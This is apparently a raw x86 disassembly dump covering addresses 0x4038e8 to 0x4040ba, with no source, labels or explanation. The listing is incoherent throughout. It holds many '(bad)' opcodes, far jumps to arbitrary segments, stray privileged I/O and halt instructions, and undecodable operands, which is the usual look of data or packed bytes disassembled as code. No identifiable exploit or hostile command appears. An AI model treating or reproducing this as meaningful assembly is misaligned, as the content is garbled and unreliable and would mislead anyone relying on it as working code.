  4038e8:	rcl    ebp,cl
  4038ea:	(bad)  [ebx]
  4038ec:	loope  0x403946
  4038ee:	nop
  4038ef:	pop    ds
  4038f0:	imul   ecx,eax,0xffffffef
  4038f3:	mov    ch,0xc0
  4038f5:	inc    edx
  4038f6:	jl     0x403969
  4038f8:	inc    eax
  4038f9:	loopne 0x4038d2
  4038fb:	test   DWORD PTR [esp+ecx*1+0x4a139d6f],0x14a8d032
  403906:	pusha  
  403907:	scas   al,BYTE PTR es:[edi]
  403908:	xchg   edi,eax
  403909:	pushf  
  40390a:	pusha  
  40390b:	sbb    DWORD PTR [eax-0x56417803],esp
  403911:	int3   
  403912:	jmp    0xdae4:0x8a4e6628
  403919:	outs   dx,DWORD PTR ds:[esi]
  40391a:	push   DWORD PTR [edx+0x4b]
  40391d:	mov    bl,0x9f
  40391f:	jo     0x403924
  403921:	je     0x403922
  403923:	retf   0x30a0
  403926:	ret    
  403927:	jo     0x4038b6
  403929:	mov    dl,0xcc
  40392b:	lods   eax,DWORD PTR ds:[esi]
  40392c:	sbb    BYTE PTR [ebp-0x180226ec],bl
  403932:	pcmpgtw mm4,QWORD PTR [edx+0x3461a3f4]
  403939:	xchg   esp,eax
  40393a:	das    
  40393b:	(bad)  [edi+ecx*8]
  40393e:	loop   0x40394d
  403940:	test   al,0x35
  403942:	xor    bh,al
  403944:	push   ebp
  403945:	xor    bl,bl
  403947:	jnp    0x403914
  403949:	xchg   DWORD PTR [edi-0x4bdc3fd3],edx
  40394f:	dec    edx
  403950:	xor    bl,BYTE PTR [ebp-0x5c47cc85]
  403956:	(bad)  
  403958:	aaa    
  403959:	test   bl,bl
  40395b:	mov    ebp,0x764ed82d
  403960:	mov    dh,0x60
  403962:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403963:	arpl   WORD PTR [eax-0x16],cx
  403966:	add    eax,0xc02c2b4e
  40396b:	push   eax
  40396c:	sbb    dl,dl
  40396e:	inc    ebp
  40396f:	lea    ebx,[ecx-0x4da8d061]
  403975:	push   ss
  403976:	sub    eax,0xef291208
  40397b:	sub    BYTE PTR [ebp-0x769b3eba],0xe7
  403982:	cs inc ebp
  403984:	hlt    
  403985:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403986:	(bad)  
  403987:	xchg   ebp,eax
  403988:	mov    ch,0x50
  40398a:	push   esi
  40398b:	or     ebx,DWORD PTR [edi+edx*1]
  40398e:	imul   ebx,DWORD PTR [edx+eax*1],0xffffffbc
  403992:	push   0xfffffff5
  403994:	jle    0x4039cb
  403996:	ror    DWORD PTR [edi],0x84
  403999:	xor    dl,BYTE PTR [ebp-0x279f8cfc]
  40399f:	por    mm6,QWORD PTR [esi+0x6f]
  4039a3:	daa    
  4039a4:	pop    esi
  4039a5:	repz push ds
  4039a7:	mov    cl,0x4
  4039a9:	add    BYTE PTR [eax],0xb9
  4039ac:	mov    cl,0x57
  4039ae:	push   esp
  4039af:	js     0x40395e
  4039b1:	push   ebx
  4039b2:	xchg   ebp,eax
  4039b3:	xor    BYTE PTR [eiz*8+0x60aa9f69],0xf
  4039bb:	push   0x6b1fcee7
  4039c0:	mov    ch,0xb8
  4039c2:	jne    0x403a35
  4039c4:	sub    bh,BYTE PTR [ebx]
  4039c6:	pusha  
  4039c7:	xchg   ebp,eax
  4039c8:	dec    ecx
  4039c9:	dec    esi
  4039ca:	jno    0x403a3b
  4039cc:	rcr    ah,1
  4039ce:	inc    edi
  4039cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4039d0:	jg     0x403a46
  4039d2:	sbb    esp,DWORD PTR [edi+eiz*8+0x4473f0ae]
  4039d9:	dec    edx
  4039da:	popa   
  4039db:	dec    eax
  4039dc:	cld    
  4039dd:	xchg   esi,eax
  4039de:	pop    edi
  4039df:	mov    ds:0xc5abf741,al
  4039e4:	sbb    al,0xf8
  4039e6:	push   ecx
  4039e7:	or     esi,ebp
  4039e9:	inc    edx
  4039ea:	xor    al,0x5c
  4039ec:	xchg   edi,eax
  4039ed:	jg     0x403986
  4039ef:	retf   0x4f51
  4039f2:	sub    eax,0x9bf28ed2
  4039f7:	pusha  
  4039f8:	test   BYTE PTR [ebp+0x61c1f54d],0x50
  4039ff:	jae    0x4039dc
  403a01:	ss mov ch,0x4b
  403a04:	test   eax,0xa1d1c38
  403a09:	mov    BYTE PTR [edi+0x382371bc],dh
  403a0f:	cmp    bl,BYTE PTR [esi+0x718e2147]
  403a15:	mov    bl,0x88
  403a17:	inc    ebx
  403a18:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403a19:	and    eax,0xf983931e
  403a1e:	mov    ebx,0x89d65f97
  403a23:	push   esi
  403a24:	push   es
  403a25:	and    DWORD PTR [ebp-0x760457ec],0x348e4aa6
  403a2f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403a30:	call   0xc4dd2b8e
  403a35:	add    BYTE PTR [eax+0x4a],0x27
  403a39:	xchg   DWORD PTR [edx-0x3a354d6],ebp
  403a3f:	and    DWORD PTR cs:[edx],ebp
  403a42:	and    eax,0x4c7a8f49
  403a47:	pop    esp
  403a48:	adc    al,0x7e
  403a4a:	sbb    eax,0x4897cf85
  403a4f:	and    bl,bh
  403a51:	sbb    ebp,DWORD PTR [edx+edx*4]
  403a54:	fild   QWORD PTR [ecx+eax*8+0x3f]
  403a58:	mul    DWORD PTR [ebp*1-0x2c6ca69e]
  403a5f:	mov    ebp,0x41901649
  403a64:	sub    al,BYTE PTR [eax]
  403a66:	shl    DWORD PTR [esi+0x5ccd97fb],0xdd
  403a6d:	fisubr DWORD PTR [ecx+ecx*1+0x6e]
  403a71:	xor    eax,0xb6a12ba2
  403a76:	in     eax,dx
  403a77:	jmp    0x5f3f:0x9bbe9bea
  403a7e:	iret   
  403a7f:	inc    ebp
  403a80:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403a81:	fsubr  DWORD PTR [edi-0x3c757639]
  403a87:	mov    bh,0x22
  403a89:	pop    esp
  403a8a:	fdivr  QWORD PTR [edi]
  403a8c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403a8d:	push   ecx
  403a8e:	lods   eax,DWORD PTR ds:[esi]
  403a8f:	pop    ss
  403a90:	adc    al,0xee
  403a92:	idiv   ah
  403a94:	in     al,0xda
  403a96:	xor    eax,DWORD PTR [eax]
  403a98:	out    dx,eax
  403a99:	addr16 or al,0x20
  403a9c:	push   eax
  403a9d:	in     eax,0x76
  403a9f:	cmp    esp,esp
  403aa1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403aa2:	jp     0x403aac
  403aa4:	inc    edx
  403aa5:	call   0xb2a13bb
  403aaa:	push   esp
  403aab:	out    dx,al
  403aac:	shl    BYTE PTR [edx+0x25],1
  403aaf:	xchg   dl,ch
  403ab1:	or     BYTE PTR [edi],cl
  403ab3:	out    0x46,al
  403ab5:	das    
  403ab6:	mov    dh,0x32
  403ab8:	mov    al,0x2e
  403aba:	loop   0x403b38
  403abc:	inc    eax
  403abd:	or     BYTE PTR [ebx+edi*2],bh
  403ac0:	fwait
  403ac1:	mov    bh,0x88
  403ac3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403ac4:	sbb    ah,BYTE PTR [ecx]
  403ac6:	dec    edi
  403ac7:	mov    ds:0xb154efc7,eax
  403acc:	or     BYTE PTR ds:0x80b8f12d,dl
  403ad2:	push   0x68
  403ad4:	jmp    0x403ac6
  403ad6:	popa   
  403ad7:	mov    ebp,0xd8392a21
  403adc:	push   esp
  403add:	inc    ebx
  403ade:	mov    ebx,0x8b76b5b5
  403ae3:	jmp    0xb2d6:0x31784f09
  403aea:	xchg   ebp,eax
  403aeb:	pop    esi
  403aec:	bsr    esi,DWORD PTR [ebx+eiz*1-0x17da31f9]
  403af4:	not    DWORD PTR [eax+0x16]
  403af7:	mov    cl,0x63
  403af9:	and    ecx,DWORD PTR [edi-0x70bc0e08]
  403aff:	xchg   DWORD PTR [ecx-0xcd33237],esi
  403b05:	dec    DWORD PTR [esi+0x58]
  403b08:	repz xchg edi,eax
  403b0a:	xchg   ecx,eax
  403b0b:	sti    
  403b0c:	out    dx,al
  403b0d:	fstp   TBYTE PTR [ecx+0x61168713]
  403b13:	jno    0x403ae3
  403b15:	mov    ?,WORD PTR [ecx-0x38168bb8]
  403b1b:	into   
  403b1c:	mov    cs,WORD PTR [edi+ebp*1-0x40]
  403b20:	(bad)  
  403b21:	lock mov ds:0x2ae55a41,al
  403b27:	fist   WORD PTR [edi+0x2546fbea]
  403b2d:	ds mov dl,0x5c
  403b30:	imul   esp,DWORD PTR [edi],0x73f984b7
  403b36:	sub    DWORD PTR [eax+edi*8+0x4c],eax
  403b3a:	mov    ebp,0xb2d139f2
  403b3f:	adc    edx,DWORD PTR [esi-0x25]
  403b42:	or     DWORD PTR [eax+0x396eb02c],ebp
  403b48:	ds jno 0x403b36
  403b4b:	test   al,0x9f
  403b4d:	loop   0x403bb4
  403b4f:	mov    DWORD PTR [esi-0x13],eax
  403b52:	mov    esp,0x397a5550
  403b57:	aas    
  403b58:	or     bl,BYTE PTR [edx+0x3b]
  403b5b:	pusha  
  403b5c:	inc    esi
  403b5d:	out    dx,al
  403b5e:	test   eax,edx
  403b60:	xlat   BYTE PTR ds:[ebx]
  403b61:	in     eax,0xa9
  403b63:	sub    eax,0x8898d3b0
  403b68:	loop   0x403b79
  403b6a:	or     al,0x92
  403b6c:	jmp    0x6a05ad44
  403b71:	mov    ebp,0x2a07cee3
  403b76:	lods   eax,DWORD PTR ds:[esi]
  403b77:	dec    esi
  403b78:	cli    
  403b79:	push   0xb541f805
  403b7e:	in     eax,0xba
  403b80:	nop
  403b81:	cmp    DWORD PTR [edi+0x44],edx
  403b84:	push   eax
  403b85:	add    ch,cl
  403b87:	clc    
  403b88:	jmp    0x403ba4
  403b8a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403b8b:	mov    dl,0x4
  403b8d:	mov    ds:0x6d9ebbb4,al
  403b92:	inc    eax
  403b93:	sub    DWORD PTR [edi-0x16],edi
  403b96:	push   eax
  403b97:	fidiv  DWORD PTR [eax+0x3dcb82a6]
  403b9d:	xchg   esi,eax
  403b9e:	sbb    edx,DWORD PTR [eax-0x16]
  403ba1:	sub    esi,DWORD PTR [esi+edx*1+0x16]
  403ba5:	mov    ecx,0x3cb592fe
  403baa:	(bad)  
  403bab:	mov    edx,0x3967bb51
  403bb0:	add    BYTE PTR [ebp-0x1523753],bh
  403bb6:	xchg   ecx,eax
  403bb7:	nop
  403bb8:	mov    cl,0x73
  403bba:	pop    esp
  403bbb:	arpl   WORD PTR [ecx+ecx*2-0x42316a40],ax
  403bc2:	mov    ebx,0xf2de4f34
  403bc7:	inc    esp
  403bc8:	rcr    ch,1
  403bca:	mov    ecx,0x1c80c069
  403bcf:	dec    esp
  403bd0:	mov    edx,0x140a71fd
  403bd5:	inc    ebx
  403bd6:	push   ebp
  403bd7:	sbb    al,0xa5
  403bd9:	clc    
  403bda:	retf   
  403bdb:	ror    edx,1
  403bdd:	mov    ecx,0xb117f1d9
  403be2:	sahf   
  403be3:	mov    eax,ds:0x60af69fd
  403be8:	or     eax,0xf7243e11
  403bed:	sbb    al,0xcd
  403bef:	mov    DWORD PTR [edx+0x63d0ecf9],ecx
  403bf5:	mov    eax,ds:0xb8d3d7ed
  403bfa:	sub    DWORD PTR [ebx],edi
  403bfc:	adc    esp,DWORD PTR [eax+esi*2-0x60]
  403c00:	or     ch,al
  403c02:	lods   eax,DWORD PTR ds:[esi]
  403c03:	cmp    ah,al
  403c05:	cli    
  403c06:	xchg   ebp,eax
  403c07:	mov    ebx,0x4efde99f
  403c0c:	mov    dl,0xab
  403c0e:	scas   eax,DWORD PTR es:[edi]
  403c0f:	xor    bh,BYTE PTR [edi]
  403c11:	dec    eax
  403c12:	pop    edi
  403c13:	sub    BYTE PTR [edi],0x99
  403c16:	mov    BYTE PTR [edi+0xad44240],al
  403c1c:	int    0x15
  403c1e:	mov    ecx,0x79167bf1
  403c23:	in     al,0x96
  403c25:	jecxz  0x403c70
  403c27:	xchg   esp,eax
  403c28:	mov    BYTE PTR [ebx-0x3e2f2f4c],ah
  403c2e:	jae    0x403bf3
  403c30:	pop    es
  403c31:	cmp    al,0x10
  403c33:	mov    ds:0x9b5844e0,al
  403c38:	popa   
  403c39:	and    DWORD PTR [ebx+0x3f],esp
  403c3c:	push   esp
  403c3d:	retf   
  403c3e:	call   0x6df1e93a
  403c43:	pop    ds
  403c44:	in     al,dx
  403c45:	pop    ds
  403c46:	cmp    bl,BYTE PTR [edi]
  403c48:	inc    esi
  403c49:	outs   dx,BYTE PTR ds:[esi]
  403c4a:	mov    ebx,0x4217bdec
  403c4f:	jge    0x403cc8
  403c51:	inc    eax
  403c52:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403c53:	jb     0x403bf2
  403c55:	imul   bh
  403c57:	xchg   DWORD PTR [ebx-0x743c3e73],ebp
  403c5d:	mov    ch,0x47
  403c5f:	push   ebp
  403c60:	push   ebp
  403c61:	je     0x403c59
  403c63:	push   ds
  403c64:	jmp    0x12b585b9
  403c69:	jno    0x403bec
  403c6b:	mov    edx,0xa4bd2e6
  403c70:	adc    al,0xfc
  403c72:	jae    0x403cbd
  403c74:	push   edx
  403c75:	adc    BYTE PTR ds:[ecx-0x13],al
  403c79:	inc    esp
  403c7a:	aas    
  403c7b:	in     eax,0x5f
  403c7d:	sub    DWORD PTR [ecx+0x6bad8703],esp
  403c83:	mov    edx,0x7a87ec2c
  403c88:	mov    al,ds:0xa8e6f877
  403c8d:	xchg   esi,eax
  403c8e:	adc    eax,0xac859ae
  403c93:	pop    ebp
  403c94:	xor    al,0x11
  403c96:	sbb    ch,ah
  403c98:	in     eax,0x8a
  403c9a:	inc    eax
  403c9b:	out    dx,al
  403c9c:	bound  ebx,QWORD PTR [ecx+0x14]
  403c9f:	jecxz  0x403cc3
  403ca1:	jo     0x403ca8
  403ca3:	(bad)  [esi*4+0x53ebc231]
  403caa:	les    ebx,FWORD PTR [edx-0x6e]
  403cad:	jp     0x403cb2
  403caf:	jmp    0xe47:0x8afdcd02
  403cb6:	lods   al,BYTE PTR ds:[esi]
  403cb7:	or     al,0x52
  403cb9:	mov    ch,ch
  403cbb:	and    BYTE PTR [eax-0xa6229d],dh
  403cc1:	rol    BYTE PTR [esi-0x2ee76b08],cl
  403cc7:	ficomp WORD PTR [esi-0x2d4f25a6]
  403ccd:	mov    edi,0x72da2d8f
  403cd2:	push   es
  403cd3:	outs   dx,DWORD PTR ds:[esi]
  403cd4:	arpl   WORD PTR [ecx-0x53],sp
  403cd7:	jns    0x403d4c
  403cd9:	lea    eax,[ebp-0x3560fbfd]
  403cdf:	loop   0x403d5a
  403ce1:	mov    ch,0x25
  403ce3:	in     al,dx
  403ce4:	or     esi,DWORD PTR [edx-0x32f46f29]
  403cea:	and    al,0xb
  403cec:	sub    DWORD PTR [ebx],edx
  403cee:	jp     0x403d6d
  403cf0:	out    dx,al
  403cf1:	popf   
  403cf2:	stos   BYTE PTR es:[edi],al
  403cf3:	cli    
  403cf4:	push   eax
  403cf5:	fisub  WORD PTR [edx]
  403cf7:	stc    
  403cf8:	pop    eax
  403cf9:	js     0x403cd7
  403cfb:	iret   
  403cfc:	xchg   ecx,eax
  403cfd:	jp     0x403c8a
  403cff:	xlat   BYTE PTR ds:[ebx]
  403d00:	repnz add bl,BYTE PTR [ebp-0x6288b168]
  403d07:	ja     0x403d80
  403d09:	mov    esp,0x5a76ee78
  403d0e:	push   eax
  403d0f:	div    BYTE PTR [edi+0x65b0522f]
  403d15:	pop    esp
  403d16:	(bad)  
  403d17:	jp     0x403d03
  403d19:	cwde   
  403d1a:	xor    al,0x4e
  403d1c:	dec    ebp
  403d1d:	pushf  
  403d1e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403d1f:	jne    0x403d13
  403d21:	adc    BYTE PTR [edi-0x5f762952],ah
  403d27:	scas   al,BYTE PTR es:[edi]
  403d28:	push   0xffffff85
  403d2a:	cs jl  0x403cf8
  403d2d:	dec    eax
  403d2e:	xlat   BYTE PTR ds:[ebx]
  403d2f:	addr16 jnp 0x403ccc
  403d32:	pushf  
  403d33:	fwait
  403d34:	test   al,0x45
  403d36:	stos   BYTE PTR es:[edi],al
  403d37:	add    eax,0x575a5e1e
  403d3c:	dec    ebp
  403d3d:	jl     0x403d5d
  403d3f:	popf   
  403d40:	ret    0x4a1c
  403d43:	dec    esi
  403d44:	cld    
  403d45:	fiadd  WORD PTR [ebx]
  403d47:	adc    dh,cl
  403d49:	pop    es
  403d4a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403d4b:	inc    ebx
  403d4c:	sbb    BYTE PTR [edx+0x4a10c092],bh
  403d52:	adc    BYTE PTR [edx-0x79],cl
  403d55:	adc    dl,BYTE PTR [ebx-0x63106ad]
  403d5b:	sbb    eax,0x1ab1dcdd
  403d60:	mov    edi,0x7b94b3aa
  403d65:	pop    es
  403d66:	pop    eax
  403d67:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403d68:	xchg   dl,bh
  403d6a:	mov    ds:0x951505ea,eax
  403d6f:	or     edi,DWORD PTR [edi+0x4d]
  403d72:	(bad)  
  403d73:	div    cl
  403d75:	pop    edi
  403d76:	mov    ecx,DWORD PTR [ebp+0x60]
  403d79:	mov    dl,bl
  403d7b:	std    
  403d7c:	cmp    DWORD PTR [ecx+0xa909ec4],ecx
  403d82:	jnp    0x403d5f
  403d84:	mov    edi,DWORD PTR [esi+ecx*8-0x6c6796c2]
  403d8b:	fistp  WORD PTR [ecx+0x11]
  403d8e:	clc    
  403d8f:	xchg   DWORD PTR [esi],esp
  403d91:	inc    ebx
  403d92:	inc    ecx
  403d93:	leave  
  403d94:	data16 icebp 
  403d96:	js     0x403df3
  403d98:	xchg   edi,eax
  403d99:	jne    0x403d81
  403d9b:	(bad)  
  403d9c:	sub    esi,edx
  403d9e:	mov    ah,0x9a
  403da0:	lock (bad) gs:[eax+eax*2+0x7479df3d]
  403da9:	hlt    
  403daa:	arpl   WORD PTR gs:[ebx],si
  403dad:	xchg   edx,eax
  403dae:	inc    edi
  403daf:	add    ah,BYTE PTR [esi]
  403db1:	rcr    DWORD PTR [ecx+0x58],1
  403db4:	ins    DWORD PTR es:[edi],dx
  403db5:	outs   dx,DWORD PTR ds:[esi]
  403db6:	jp     0x403d3b
  403db8:	stc    
  403db9:	addr16 je 0x403e2d
  403dbc:	or     bl,al
  403dbe:	xor    BYTE PTR [ebp-0x77],bh
  403dc1:	imul   ebp,DWORD PTR [ebx],0xf27f527f
  403dc7:	in     eax,dx
  403dc8:	push   esi
  403dc9:	enter  0x4453,0x97
  403dcd:	fistp  QWORD PTR [edi+0x4814684b]
  403dd3:	xor    edi,DWORD PTR [edx+0x5c92a48c]
  403dd9:	enter  0x580b,0x4b
  403ddd:	xor    esp,edi
  403ddf:	inc    ebx
  403de0:	sub    al,0x95
  403de2:	cmp    DWORD PTR [ecx],edi
  403de4:	repz repnz push ss
  403de7:	into   
  403de8:	adc    BYTE PTR [eax+0x5b70b5a8],ch
  403dee:	xor    ebx,0x175a19d7
  403df4:	sub    eax,0x6be24f10
  403df9:	test   ebx,esp
  403dfb:	jmp    0x2e3c:0x7da6a99e
  403e02:	out    0x10,eax
  403e04:	mov    cl,0xe
  403e06:	out    0x38,eax
  403e08:	xor    al,0x3
  403e0a:	fst    QWORD PTR [eax+0x20]
  403e0d:	sbb    dl,BYTE PTR [eax-0x7d31c7ca]
  403e13:	repnz and ecx,DWORD PTR [ebx]
  403e16:	mov    WORD PTR [ebx+0x26],?
  403e19:	pop    esp
  403e1a:	les    esi,FWORD PTR [ecx]
  403e1c:	pop    ds
  403e1d:	inc    eax
  403e1e:	cmp    DWORD PTR es:[ebx-0xf52ebdd],esp
  403e25:	mov    ecx,DWORD PTR [ebp+0x48]
  403e28:	imul   edx,DWORD PTR [edx+0x2f],0xcb269dc8
  403e2f:	pushf  
  403e30:	shl    DWORD PTR [ebx+0x6b630154],cl
  403e36:	int    0xee
  403e38:	and    eax,0xefbdef49
  403e3d:	repz dec ebp
  403e3f:	jbe    0x403df4
  403e41:	push   ecx
  403e42:	rol    esi,0x8
  403e45:	mov    WORD PTR ds:0x63b3a169,ds
  403e4b:	mov    al,0x54
  403e4d:	jge    0x403e79
  403e4f:	retf   0xe87
  403e52:	out    dx,al
  403e53:	xchg   ecx,eax
  403e54:	js     0x403df4
  403e56:	jle    0x403e12
  403e58:	ficom  WORD PTR [ebp-0x35]
  403e5b:	loope  0x403e2e
  403e5d:	dec    esi
  403e5e:	(bad)  
  403e5f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403e60:	mov    edi,0x95c0d77e
  403e65:	(bad)  
  403e66:	retf   0xdb0f
  403e69:	inc    esi
  403e6a:	mov    al,ds:0x9c24f523
  403e6f:	test   DWORD PTR ds:0xfba8b3ca,ebx
  403e75:	push   cs
  403e76:	push   ds
  403e77:	jns    0x403e41
  403e79:	inc    esp
  403e7a:	sub    ebp,DWORD PTR [ecx]
  403e7c:	stos   DWORD PTR es:[edi],eax
  403e7d:	loop   0x403e26
  403e7f:	xchg   ebp,eax
  403e80:	mov    ch,0x7e
  403e82:	shl    BYTE PTR [ebx],1
  403e84:	lea    edx,[ecx-0x6f4ca506]
  403e8a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403e8b:	ret    0xb6b0
  403e8e:	rol    DWORD PTR [edi-0x782c19],1
  403e94:	and    BYTE PTR [edx+0x1c],dh
  403e97:	lds    edx,FWORD PTR [edx]
  403e99:	lds    eax,FWORD PTR [esp+ebp*8+0xa3a0d8a]
  403ea0:	(bad)  
  403ea1:	jl     0x403e29
  403ea3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403ea4:	mov    eax,0x7f202058
  403ea9:	add    BYTE PTR [ebx],al
  403eab:	test   DWORD PTR [ebx+edx*8-0x70723ae5],0xf60a62e8
  403eb6:	jmp    0xf900:0xd34bf4b8
  403ebd:	cs popf 
  403ebf:	test   al,0x81
  403ec1:	jmp    ebp
  403ec3:	shl    BYTE PTR [edx+0x1574d4d],0xbe
  403eca:	scas   al,BYTE PTR es:[edi]
  403ecb:	jne    0x403e76
  403ecd:	inc    ebp
  403ece:	sub    BYTE PTR [ebx],bh
  403ed0:	lock out dx,al
  403ed2:	test   DWORD PTR [esi-0x4f5e914c],esp
  403ed8:	(bad)  
  403ed9:	cdq    
  403eda:	dec    ecx
  403edb:	cmc    
  403edc:	aaa    
  403edd:	inc    ebx
  403ede:	sub    al,0x8c
  403ee0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403ee1:	and    ebp,eax
  403ee3:	and    ch,BYTE PTR [esi+0x59]
  403ee6:	xor    eax,0xc9cb7930
  403eeb:	adc    eax,0xe1eb3f3c
  403ef0:	call   0x54b86a6c
  403ef5:	jecxz  0x403ea1
  403ef7:	and    BYTE PTR [edx+ebx*2+0x3e],ch
  403efb:	pushf  
  403efc:	ins    DWORD PTR es:[edi],dx
  403efd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403efe:	shl    BYTE PTR [esi-0xf6a6405],0x63
  403f05:	arpl   WORD PTR [edi],si
  403f07:	lods   al,BYTE PTR ds:[esi]
  403f08:	xor    edx,0x3b
  403f0b:	sub    al,0xc9
  403f0d:	bswap  edx
  403f0f:	and    DWORD PTR [eax+0x5488a464],ebx
  403f15:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403f16:	push   ds
  403f17:	stos   DWORD PTR es:[edi],eax
  403f18:	das    
  403f19:	iret   
  403f1a:	outs   dx,DWORD PTR ds:[esi]
  403f1b:	cmp    eax,0xc0de31af
  403f20:	inc    esp
  403f21:	or     ah,dh
  403f23:	mov    ds:0x63ae239c,al
  403f28:	mov    ss,ebx
  403f2a:	ficom  WORD PTR ds:0xbde59d3f
  403f30:	inc    edi
  403f31:	jbe    0x403ee2
  403f33:	lods   eax,DWORD PTR ds:[esi]
  403f34:	jmp    0xc2e87ee6
  403f39:	aam    0xe0
  403f3b:	lds    edi,FWORD PTR [ecx]
  403f3d:	xor    ebx,DWORD PTR [esi]
  403f3f:	(bad)  
  403f40:	push   edi
  403f41:	fwait
  403f42:	mov    dl,0xdf
  403f44:	dec    ebx
  403f45:	je     0x403f55
  403f47:	cwde   
  403f48:	mov    al,0xc1
  403f4a:	nop
  403f4b:	sub    eax,0x18540b62
  403f50:	(bad)  
  403f51:	arpl   WORD PTR [edx+0x45a5a576],si
  403f57:	arpl   si,di
  403f59:	aaa    
  403f5a:	jle    0x403f70
  403f5c:	mov    al,ds:0x5b9197a2
  403f61:	cmp    DWORD PTR [ebp-0x47],esp
  403f64:	mov    BYTE PTR [eax],ah
  403f66:	call   0x3ece75a0
  403f6b:	in     al,0xa5
  403f6d:	fcomp  QWORD PTR [ecx+0xc]
  403f70:	cmp    eax,ebx
  403f72:	mov    esi,0x2036cfe0
  403f77:	ret    
  403f78:	je     0x403f1a
  403f7a:	add    DWORD PTR [ecx+0x5],edx
  403f7d:	lds    ebx,FWORD PTR [ebx+0x588315f7]
  403f83:	fimul  DWORD PTR [esi+0x7a]
  403f86:	xchg   BYTE PTR [edi],bl
  403f88:	sbb    eax,0xa9a7e2f9
  403f8d:	xchg   ecx,eax
  403f8e:	popf   
  403f8f:	push   edi
  403f90:	dec    ecx
  403f91:	dec    ebp
  403f92:	(bad)  [esi-0x76afa36b]
  403f98:	retf   0x9996
  403f9b:	aam    0x4c
  403f9d:	cdq    
  403f9e:	jo     0x403fd2
  403fa0:	ss out dx,al
  403fa2:	add    al,0xa2
  403fa4:	in     eax,0xa1
  403fa6:	mov    bh,0xfb
  403fa8:	stos   BYTE PTR es:[edi],al
  403fa9:	and    ah,BYTE PTR [ebx+0x5]
  403fac:	push   ebp
  403fad:	or     eax,0x4d134545
  403fb2:	mov    esp,0xff1d564a
  403fb7:	sub    al,0xbd
  403fb9:	push   edi
  403fba:	mov    eax,DWORD PTR [ebx]
  403fbc:	repz pusha 
  403fbe:	pop    edx
  403fbf:	xchg   esi,eax
  403fc0:	inc    ebp
  403fc1:	adc    BYTE PTR ds:0xc733f71e,0xfd
  403fc8:	lods   al,BYTE PTR ds:[esi]
  403fc9:	pop    ds
  403fca:	mov    edi,DWORD PTR [ebp-0x459228cc]
  403fd0:	jl     0x404009
  403fd2:	adc    DWORD PTR [edi+0x1a],edi
  403fd5:	shl    DWORD PTR ds:0x4a45632f,1
  403fdb:	mov    ds:0x8480ccad,al
  403fe0:	xor    bh,bl
  403fe2:	push   edx
  403fe3:	scas   eax,DWORD PTR es:[edi]
  403fe4:	(bad)  
  403fe5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403fe6:	and    esp,ecx
  403fe8:	mul    esp
  403fea:	adc    bh,BYTE PTR [ebx-0x30]
  403fed:	jmp    0xe8e5:0xc19d3011
  403ff4:	ds dec edi
  403ff6:	rol    BYTE PTR [edi+0x5a0cb185],cl
  403ffc:	add    DWORD PTR [esi],esp
  403ffe:	dec    esi
  403fff:	add    eax,0x78c845fc
  404004:	(bad)  
  404006:	adc    DWORD PTR [edi-0x601b3b42],esi
  40400c:	in     al,0xd3
  40400e:	add    eax,0xd127cc1f
  404013:	stos   BYTE PTR es:[edi],al
  404014:	mov    al,ds:0x7b9395ff
  404019:	jns    0x40407f
  40401b:	sub    edx,DWORD PTR ds:0x3b2b123b
  404021:	sub    al,0xc
  404023:	mov    ds:0x68a689b5,al
  404028:	mov    esi,0x5539304e
  40402d:	xor    BYTE PTR [ecx+0x369685f1],dh
  404033:	jno    0x40404b
  404035:	int3   
  404036:	mov    ecx,0xf9c6e519
  40403b:	pusha  
  40403c:	xchg   edi,eax
  40403d:	fadd   QWORD PTR [ecx-0x534ae5a7]
  404043:	nop
  404044:	jne    0x403ff3
  404046:	adc    al,0x2d
  404048:	jge    0x40408c
  40404a:	add    BYTE PTR [ebx],cl
  40404c:	lds    esp,FWORD PTR [edi-0x29]
  40404f:	push   edx
  404050:	dec    ebx
  404051:	add    DWORD PTR [edi],esi
  404053:	hlt    
  404054:	ss xor eax,0x9d89d6c2
  40405a:	mov    ecx,0x6886088f
  40405f:	jmp    0x40405f
  404061:	sub    BYTE PTR [edx],al
  404063:	mov    DWORD PTR [ecx+0x55],eax
  404066:	dec    esp
  404067:	call   0xff96:0xd901ac7a
  40406e:	imul   ebp,DWORD PTR [edi-0x9faa908],0xffffff94
  404075:	add    esp,0xffffffd2
  404078:	push   ss
  404079:	loopne 0x404097
  40407b:	call   0x362abf79
  404080:	ud0    bx,WORD PTR [edx]
  404084:	mov    BYTE PTR [ebp+0x7eb32eee],cl
  40408a:	mov    dl,0x5b
  40408c:	(bad)  
  40408d:	enter  0x3031,0x66
  404091:	stos   DWORD PTR es:[edi],eax
  404092:	mov    WORD PTR [ecx+0x73],cs
  404095:	rol    esp,1
  404097:	repz dec eax
  404099:	pop    ecx
  40409a:	loopne 0x404073
  40409c:	pop    ss
  40409d:	jmp    0x404070
  40409f:	cmp    al,0xb3
  4040a1:	or     ebp,edi
  4040a3:	loop   0x404042
  4040a5:	popf   
  4040a6:	in     al,dx
  4040a7:	mov    ch,0xce
  4040a9:	mov    eax,ds:0x3278fe19
  4040ae:	call   DWORD PTR [esi+0x40]
  4040b1:	cmp    BYTE PTR [edi-0x2f],0x5
  4040b5:	ret    
  4040b6:	xchg   ecx,eax
  4040b7:	cmp    ebp,edx
  4040b9:	into   
  4040ba:	sbb    BYTE PTR [esi+edx*4],ah
